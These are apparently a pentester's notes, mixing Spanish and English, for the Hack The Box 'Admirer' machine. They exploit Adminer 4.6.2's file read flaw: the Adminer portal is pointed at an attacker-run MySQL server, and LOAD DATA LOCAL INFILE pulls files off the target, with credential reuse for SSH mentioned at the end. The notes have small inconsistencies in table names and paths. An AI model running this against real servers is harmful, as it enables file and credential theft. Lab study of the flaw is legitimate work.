## DESCRIPTION

Adminer es una herramienta para administrar contenido en bases de datos. Es compatible de forma nativa con MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch y MongoDB. Adminer se distribuye bajo licencia Apache en forma de un único archivo PHP.

La versión 4.6.2 tiene una vulnerabilidad que permite leer ficheros locales de la máquina que esta correindo Admirer. 

#### Mas información
* https://0xdf.gitlab.io/2020/09/26/htb-admirer.html
* Video S4vitar
* Mejor Writeup: https://infosecwriteups.com/htb-admirer-writeup-171abd8d399c

## EXPLOITATION

### OPTION 1: Manual

1. Run the following commands on the attacker machine:
```
sudo service mysql start
sudo mysql
```


2. After logging in, create the user and grant all the privileges for the new database we will create.

```
CREATE DATABASE admirerExposed;
SHOW DATABASES;
USE admirerExposed;
CREATE TABLE tableTEST(columnTest varchar(5000));
```

3. Creamos el usuario en nuestra base de datos:

```
GRANT ALL PRIVILEGES ON admirerExposed.* TO ‘testName’@’%’ IDENTIFIED BY ‘testPassword’;
```

4. Comprobamos qeu se ha creado elusuario

```
SELECT user FROM mysql.user;
```

5. **!!NOTA IMPORTANTE!!** 

Now within the **/etc/mysql/mariadb.conf.d/50-server.cnf** file, change the **bind-address** to **0.0.0.0** to allow connection from remote host.

![[Pasted image 20230301160630.png]]

6. Reiniciamos el servidor

```
exit
sudo service mysql restart
```

Now, Run a test to see if login via both ‘**localhost**’ and ‘**remote server**’ works since we used the wildcard `%` which allows to connect from any remote host.

7. Ahora desde el portal web de Admirer podemos conectarnos a nuestra máquina:
![[Pasted image 20230301160813.png]]

8. Accedemos a SQL command:

![[Pasted image 20230301160855.png]]

9. Procedemos a leer los ficheros que queramos ejecutando la siguiente consulta:

```
LOAD DATA LOCAL INFILE 'var/lib/mysql/mysql/local.xml' 
INTO TABLE admirerExposed.test
FIELDS TERMINATED BY "\n"
```

![[Pasted image 20230301161001.png]]

Para visualizarlo ejecutamos:

```
SELECT * from admirerExposed.test;
```

**!!NOTA IMPORTANTE!!** En index.php se encontraba las credenciales de la bbdd del usuario que se reutilizaban en el ssh.

## MACHINES

* Hack The Box: Admirer

